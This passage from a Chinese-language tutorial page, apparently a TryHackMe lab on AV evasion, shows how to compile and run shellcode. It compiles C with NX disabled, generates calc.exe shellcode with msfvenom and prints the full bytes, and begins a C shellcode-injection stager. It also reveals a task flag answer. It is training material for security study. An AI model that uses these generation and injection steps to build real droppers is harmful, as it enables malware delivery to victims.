punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>然后，我们按如下方式编译并执行它，</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Compiler our C program</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ gcc </span><span class="token parameter variable" style="color:#36acaa">-g</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-Wall</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-z</span><span class="token plain"> execstack thm.c </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> thmx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ ./thmx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">THM,Rocks</span><span class="token operator" style="color:#393A34">!</span><br></span></code></pre></div></div>
<p>很好！ 它起作用了。 请注意，我们通过禁用NX保护来编译C程序，这可能会阻止我们在数据段或堆栈中正确执行代码。</p>
<p>理解shellcode及其创建方式对于以下任务至关重要，尤其是在处理shellcode的加密和编码时。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 修改您的C程序以执行以下shellcode。 标志是什么？ </summary><div><div class="collapsibleContent_i85q"><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> message</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0xeb</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x34</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x5e</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x89</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xf0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x34</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x08</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xc1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xf9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x75</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0xf2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xba</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x3c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xe8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xc7</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x55</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x49</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x7a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x78</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x31</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x74</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x73</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x2c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x72</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x36</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x2c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x34</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x69</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x62</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x31</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x65</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x7c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0a</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{y0ur-1s7-5h311c0d3}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务5-生成shellcode">任务5 生成Shellcode<a href="#任务5-生成shellcode" class="hash-link" aria-label="任务5 生成Shellcode的直接链接" title="任务5 生成Shellcode的直接链接" translate="no">​</a></h2>
<p>在本任务中，我们继续使用shellcode，并演示如何使用公共工具（如Metasploit框架）生成和执行shellcode。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="使用公共工具生成shellcode">使用公共工具生成Shellcode<a href="#使用公共工具生成shellcode" class="hash-link" aria-label="使用公共工具生成Shellcode的直接链接" title="使用公共工具生成Shellcode的直接链接" translate="no">​</a></h3>
<p>Shellcode可以针对特定格式和特定编程语言生成。 这取决于您。 例如，如果您的投放器（即主要的exe文件）包含将发送给受害者的shellcode，并且是用C编写的，那么我们需要生成一个在C中可用的shellcode格式。</p>
<p>通过公共工具生成shellcode的优点是，我们不需要从头开始制作自定义shellcode，甚至不需要成为汇编语言专家。 大多数公共C2框架都提供自己的shellcode生成器，与C2平台兼容。 当然，这对我们来说非常方便，但缺点是大多数（或者我们可以说所有）生成的shellcode都被AV供应商熟知，并且可以轻松检测到。</p>
<p>我们将在AttackBox上使用Msfvenom生成一个执行Windows文件的shellcode。 我们将创建一个运行<code>calc.exe</code>应用程序的shellcode。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Generate Shellcode to Execute calc.exe</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> x86 </span><span class="token parameter variable" style="color:#36acaa">--platform</span><span class="token plain"> windows </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/exec </span><span class="token assign-left variable" style="color:#36acaa">cmd</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">calc.exe </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: </span><span class="token number" style="color:#36acaa">193</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of c file: </span><span class="token number" style="color:#36acaa">835</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\xfc</span><span class="token string entity" style="color:#36acaa">\xe8</span><span class="token string entity" style="color:#36acaa">\x82</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x60</span><span class="token string entity" style="color:#36acaa">\x89</span><span class="token string entity" style="color:#36acaa">\xe5</span><span class="token string entity" style="color:#36acaa">\x31</span><span class="token string entity" style="color:#36acaa">\xc0</span><span class="token string entity" style="color:#36acaa">\x64</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x50</span><span class="token string entity" style="color:#36acaa">\x30</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x52</span><span class="token string entity" style="color:#36acaa">\x0c</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x52</span><span class="token string entity" style="color:#36acaa">\x14</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x72</span><span class="token string entity" style="color:#36acaa">\x28</span><span class="token string entity" style="color:#36acaa">\x0f</span><span class="token string entity" style="color:#36acaa">\xb7</span><span class="token string entity" style="color:#36acaa">\x4a</span><span class="token string entity" style="color:#36acaa">\x26</span><span class="token string entity" style="color:#36acaa">\x31</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\xac</span><span class="token string entity" style="color:#36acaa">\x3c</span><span class="token string entity" style="color:#36acaa">\x61</span><span class="token string entity" style="color:#36acaa">\x7c</span><span class="token string entity" style="color:#36acaa">\x02</span><span class="token string entity" style="color:#36acaa">\x2c</span><span class="token string entity" style="color:#36acaa">\x20</span><span class="token string entity" style="color:#36acaa">\xc1</span><span class="token string entity" style="color:#36acaa">\xcf</span><span class="token string entity" style="color:#36acaa">\x0d</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xc7</span><span class="token string entity" style="color:#36acaa">\xe2</span><span class="token string entity" style="color:#36acaa">\xf2</span><span class="token string entity" style="color:#36acaa">\x52</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x57</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x52</span><span class="token string entity" style="color:#36acaa">\x10</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x4a</span><span class="token string entity" style="color:#36acaa">\x3c</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x4c</span><span class="token string entity" style="color:#36acaa">\x11</span><span class="token string entity" style="color:#36acaa">\x78</span><span class="token string entity" style="color:#36acaa">\xe3</span><span class="token string entity" style="color:#36acaa">\x48</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd1</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x51</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x59</span><span class="token string entity" style="color:#36acaa">\x20</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd3</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x49</span><span class="token string entity" style="color:#36acaa">\x18</span><span class="token string entity" style="color:#36acaa">\xe3</span><span class="token string entity" style="color:#36acaa">\x3a</span><span class="token string entity" style="color:#36acaa">\x49</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x34</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd6</span><span class="token string entity" style="color:#36acaa">\x31</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string entity" style="color:#36acaa">\xac</span><span class="token string entity" style="color:#36acaa">\xc1</span><span class="token string entity" style="color:#36acaa">\xcf</span><span class="token string entity" style="color:#36acaa">\x0d</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xc7</span><span class="token string entity" style="color:#36acaa">\x38</span><span class="token string entity" style="color:#36acaa">\xe0</span><span class="token string entity" style="color:#36acaa">\x75</span><span class="token string entity" style="color:#36acaa">\xf6</span><span class="token string entity" style="color:#36acaa">\x03</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x7d</span><span class="token string entity" style="color:#36acaa">\xf8</span><span class="token string entity" style="color:#36acaa">\x3b</span><span class="token string entity" style="color:#36acaa">\x7d</span><span class="token string entity" style="color:#36acaa">\x24</span><span class="token string entity" style="color:#36acaa">\x75</span><span class="token string entity" style="color:#36acaa">\xe4</span><span class="token string entity" style="color:#36acaa">\x58</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x58</span><span class="token string entity" style="color:#36acaa">\x24</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd3</span><span class="token string entity" style="color:#36acaa">\x66</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x0c</span><span class="token string entity" style="color:#36acaa">\x4b</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x58</span><span class="token string entity" style="color:#36acaa">\x1c</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd3</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x04</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd0</span><span class="token string entity" style="color:#36acaa">\x89</span><span class="token string entity" style="color:#36acaa">\x44</span><span class="token string entity" style="color:#36acaa">\x24</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x24</span><span class="token string entity" style="color:#36acaa">\x5b</span><span class="token string entity" style="color:#36acaa">\x5b</span><span class="token string entity" style="color:#36acaa">\x61</span><span class="token string entity" style="color:#36acaa">\x59</span><span class="token string entity" style="color:#36acaa">\x5a</span><span class="token string entity" style="color:#36acaa">\x51</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string entity" style="color:#36acaa">\xe0</span><span class="token string entity" style="color:#36acaa">\x5f</span><span class="token string entity" style="color:#36acaa">\x5f</span><span class="token string entity" style="color:#36acaa">\x5a</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x12</span><span class="token string entity" style="color:#36acaa">\xeb</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x8d</span><span class="token string entity" style="color:#36acaa">\x5d</span><span class="token string entity" style="color:#36acaa">\x6a</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\x8d</span><span class="token string entity" style="color:#36acaa">\x85</span><span class="token string entity" style="color:#36acaa">\xb2</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x50</span><span class="token string entity" style="color:#36acaa">\x68</span><span class="token string entity" style="color:#36acaa">\x31</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x6f</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x87</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string entity" style="color:#36acaa">\xd5</span><span class="token string entity" style="color:#36acaa">\xbb</span><span class="token string entity" style="color:#36acaa">\xf0</span><span class="token string entity" style="color:#36acaa">\xb5</span><span class="token string entity" style="color:#36acaa">\xa2</span><span class="token string entity" style="color:#36acaa">\x56</span><span class="token string entity" style="color:#36acaa">\x68</span><span class="token string entity" style="color:#36acaa">\xa6</span><span class="token string entity" style="color:#36acaa">\x95</span><span class="token string entity" style="color:#36acaa">\xbd</span><span class="token string entity" style="color:#36acaa">\x9d</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string entity" style="color:#36acaa">\xd5</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x3c</span><span class="token string entity" style="color:#36acaa">\x06</span><span class="token string entity" style="color:#36acaa">\x7c</span><span class="token string entity" style="color:#36acaa">\x0a</span><span class="token string entity" style="color:#36acaa">\x80</span><span class="token string entity" style="color:#36acaa">\xfb</span><span class="token string entity" style="color:#36acaa">\xe0</span><span class="token string entity" style="color:#36acaa">\x75</span><span class="token string entity" style="color:#36acaa">\x05</span><span class="token string entity" style="color:#36acaa">\xbb</span><span class="token string entity" style="color:#36acaa">\x47</span><span class="token string entity" style="color:#36acaa">\x13</span><span class="token string entity" style="color:#36acaa">\x72</span><span class="token string entity" style="color:#36acaa">\x6f</span><span class="token string entity" style="color:#36acaa">\x6a</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x53</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string entity" style="color:#36acaa">\xd5</span><span class="token string entity" style="color:#36acaa">\x63</span><span class="token string entity" style="color:#36acaa">\x61</span><span class="token string entity" style="color:#36acaa">\x6c</span><span class="token string entity" style="color:#36acaa">\x63</span><span class="token string entity" style="color:#36acaa">\x2e</span><span class="token string entity" style="color:#36acaa">\x65</span><span class="token string entity" style="color:#36acaa">\x78</span><span class="token string entity" style="color:#36acaa">\x65</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>结果，Metasploit框架生成了一个执行Windows计算器（calc.exe）的shellcode。 Windows计算器在恶意软件开发过程中被广泛用作示例，以展示概念验证。 如果该技术有效，则会弹出一个新的Windows计算器实例。 这确认了任何可执行的shellcode都可以与所使用的方法一起工作。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="shellcode注入">Shellcode注入<a href="#shellcode注入" class="hash-link" aria-label="Shellcode注入的直接链接" title="Shellcode注入的直接链接" translate="no">​</a></h3>
<p>黑客使用各种技术将shellcode注入到正在运行的或新的线程和进程中。 Shellcode注入技术修改程序的执行流程，以更新程序的寄存器和函数，从而执行攻击者自己的代码。</p>
<p>现在让我们继续使用生成的shellcode并在操作系统上执行它。 以下是一个包含我们生成的shellcode的C代码，该shellcode将被注入到内存中并执行&quot;calc.exe&quot;。</p>
<p>在AttackBox上，让我们将以下内容保存到名为<code>calc.c</code>的文件中：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;windows.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> stager</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" 